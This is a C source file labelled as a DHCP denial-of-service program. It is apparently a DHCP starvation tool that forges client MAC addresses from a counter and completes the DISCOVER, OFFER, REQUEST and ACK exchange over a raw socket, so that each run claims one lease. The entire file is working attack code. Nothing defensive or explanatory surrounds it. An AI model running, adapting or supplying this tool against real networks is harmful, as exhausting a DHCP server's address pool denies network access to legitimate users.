/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include "construct_packet_2.h"
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>

char interface[IFNAMSIZ]={0};
#define ARPHRD_ETHER 1

struct netlink_msg{
	struct nlmsghdr  nh;
	struct ifinfomsg itf;
	char attrbuf[512];
};
struct dhcp_lease_info{



};
struct mac_address{
	unsigned char hwmac[6];

};



// struct dhcp_lease_info *dhcp_protocol(int sd,unsigned char*hwmac,unsigned int a_ip, struct ifreq itface,unsigned int type, unsigned int*server_ip);
struct dhcp_lease_info *dhcp_protocol(int sd,unsigned int xid, unsigned char*hwmac,unsigned char *dstmac, unsigned int *scrip, unsigned int *dstip, struct ifreq itface,unsigned char* fixed_mac, unsigned int type);
int strncmp_with_null(unsigned char* s1,unsigned char *s2,int number);
void *initiate_interface(void*arg);
void *recv_worker(void *arg);
void process_msg(unsigned char *packet_in, int recv_msg_len, Packet *p);
int main(int argc,char **argv){

	if(argc!=4){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface> <i (hwmac + i)> <xid>\n");
		exit(-1);
	}

	if(strlen(argv[1])>=IFNAMSIZ){
		fprintf(stderr,"interface name too long\n");
		exit(-1);
	}

	//Copy interface name to a global variable.
	memcpy(interface,argv[1],IFNAMSIZ);


	// set mac and xid
	// unsigned char *hwmac = argv[2];
	 unsigned int xid = atoi(argv[3]);

	unsigned char hwmac[6]={0x80,0xa5,0x89,0xa2,0xc5,0xff};
	//unsigned int xid = 12346;
	
	int last = 5;
	for(int i = 0; i < atoi(argv[2]) ; i++)
	{
		while(hwmac[last] == 0xff)
		{
			last -=1 ;
		}
		xid++;
		hwmac[last] += 0x01;
	}
	

	int sd;
	// printf("htons(ETH_P_IP) = %d\n", htons(ETH_P_IP));
	// printf("%d\n", IPPROTO_RAW);
	if((sd=socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW))<0){
		perror("socket()");
		exit(-1);
	}

	// printf("sd %d\n",sd);

	// get mac address
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,interface,IFNAMSIZ);

	if(ioctl(sd,SIOCGIFHWADDR, &itface) > 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}

	unsigned char fixed_mac[6];
	memcpy(fixed_mac, itface.ifr_hwaddr.sa_data, 6);
	// printf("mac_addr");
	// for(int iii=0;iii<6;iii++){
	// 	printf(":%02x",(unsigned char)(itface.ifr_hwaddr.sa_data[iii]));

	// }
	// printf("\n");
	
	
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	//Bind our file descriptor to this interface.
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);


	// send DHCP_DISCOVER
	dhcp_protocol(sd,xid, hwmac,"\xff\xff\xff\xff\xff\xff", (unsigned int *)"\x00\x00\x00\x00", (unsigned int *)"\xff\xff\xff\xff",itface, fixed_mac, DHCP_DISCOVER);	
	printf("[DHCP DISCOVER]\n");
	int recv_sd=0;
	if((recv_sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("recv socket()");
		exit(0);
	}

	unsigned char packet_in[PACKETMAXSIZE]={0};
	struct sockaddr_in dhcp_server;
	memset(&dhcp_server,0,sizeof(struct sockaddr_in));
	unsigned int recv_addr_len=sizeof(struct sockaddr_in);
	int recv_msg_len=0;
	unsigned char dhcp_port[2] = {0x00, 0x43};

	int aquired_ipaddress=0;
	struct in_addr *dhcp_server_ip;
	Packet *p;
	struct dhcp_header *dhcp;
	int router_ipaddress=0;	
	
	time_t pre;
	pre = time(NULL);
	// get dhcp offer
	while(1){
		
		time_t seconds = time(NULL);
		if(seconds - pre > 5)
		{
			exit(1);
		}
		

		memset(packet_in,0,PACKETMAXSIZE);
		recv_msg_len=recvfrom(recv_sd,packet_in,PACKETMAXSIZE,0,(struct sockaddr*)&dhcp_server,&recv_addr_len);
		p = (Packet *)packet_in;
		if(memcmp(p -> udp.srcPort, dhcp_port, 2) != 0){
			continue;
		}

		// printf("get dhcp\n");
		dhcp = (struct dhcp_header*)&(p -> data);

		if(dhcp -> xid != xid) continue;
		if(dhcp -> op != 2) continue;

		aquired_ipaddress = dhcp->your_ip;
		router_ipaddress= dhcp->server_ip;
		
		for(int offset = 4/* skip magic cookie*/;;){
			unsigned char option = dhcp -> exten[offset];
			if(option == 0xff) break;
			offset ++;
			int len = dhcp -> exten[offset];
			offset ++;
			switch(option){
				case 53: //message type
					if(dhcp -> exten[offset] == DHCP_OFFER){
						printf("[DHCP OFFER] ");
						printf("get ip: %s\n", inet_ntoa(*(struct in_addr *)&(dhcp -> your_ip)));
					}else{
						printf("something wrong!\n");
						exit(1);
					}
					break;
				case 54:
					dhcp_server_ip = (struct in_addr *)&(dhcp -> exten[offset]);
					// printf("server ip : %s\n", inet_ntoa(*dhcp_server_ip));
					break;
				default:
					break;
			}
			offset += len;
		
		}
		break;


	}
	// send dhcp_request
	dhcp_protocol(sd,xid, hwmac,p -> l2.srcMAC, &(dhcp -> your_ip), (unsigned int*)dhcp_server_ip, itface, fixed_mac, DHCP_REQUEST);	
	printf("[DHCP REQUEST]\n");

	// wait dhcp_ack
	while(1){
		memset(packet_in,0,PACKETMAXSIZE);
		recv_msg_len=recvfrom(recv_sd,packet_in,PACKETMAXSIZE,0,(struct sockaddr*)&dhcp_server,&recv_addr_len);
		p = (Packet *)packet_in;
		if(memcmp(p -> udp.srcPort, dhcp_port, 2) != 0){
			continue;
		}

		dhcp = (struct dhcp_header*)&(p -> data);

		if(dhcp -> xid != xid) continue;
		if(dhcp -> op != 2) continue;
		
		for(int offset = 4/* skip magic cookie*/;;){
			unsigned char option = dhcp -> exten[offset];
			if(option == 0xff) break;
			offset ++;
			int len = dhcp -> exten[offset];
			offset ++;
			switch(option){
				case 53: //message type
					if(dhcp -> exten[offset] == DHCP_ACK){
						printf("[DHCP ACK] success!\n");
					}else{
						printf("something wrong!\n");
						exit(1);
					}
					break;
				default:
					break;
			}
			offset += len;
		
		}
		break;


	}
	
	dhcp_protocol(sd,xid,hwmac, "\x9c\x5c\xf9\x2a\x9f\x00",&aquired_ipaddress, (unsigned int *)"\x08\x08\x08\x08",itface ,fixed_mac, DHCP_DISCOVER);	

	


	close(sd);
	return 0;
	
	
	// pthread_t recv_worker_t=0;
	// pthread_create(&recv_worker_t,NULL,recv_worker,NULL);
	
	


	return 0;

}


struct dhcp_lease_info *dhcp_protocol(int sd,unsigned int xid, unsigned char*hwmac,unsigned char *dstmac, unsigned int *srcip, unsigned int *dstip, struct ifreq itface,unsigned char* fixed_mac, unsigned int type){

	struct dhcp_lease_info *dli=(struct dhcp_lease_info*)malloc(sizeof(struct dhcp_lease_info));
	memset(dli,0,sizeof(struct dhcp_lease_info));
	// unsigned char dstmac[6]={0xff,0xff,0xff,0xff,0xff,0xff};

	//start to construct dhcp datagram
	unsigned char packet[PACKETMAXSIZE];
	// unsigned int hip=ipaddr;
	// unsigned int dip;
	// inet_pton(AF_INET,"255.255.255.255",&dip);
	
	//Host ip address will be returned in hip.
	construct_dhcp(xid,type,hwmac,dstmac, srcip, dstip, packet, fixed_mac, dstip);

	


	//Ready to send packet.
	//Specify the interface through which we sent our packet.

	struct sockaddr_ll destifaddr;
	memset(&destifaddr,0,sizeof(struct sockaddr_ll));
	destifaddr.sll_halen=ETH_ALEN;
	destifaddr.sll_ifindex=itface.ifr_ifindex;
	//It seems unnecessary to specify the mac address of destination, for we have write it in the packet we created.
	//copy_macaddr((unsigned char*)destifaddr.sll_addr,0x11,dstmac[1],dstmac[2],dstmac[3],dstmac[4],dstmac[5]);
	
	if(sendto(sd,packet,PACKETMAXSIZE,0,(struct sockaddr*)&destifaddr,sizeof(struct sockaddr_ll))<0){
		perror("sendto()");
		exit(-1);
	}

	return dli;
}
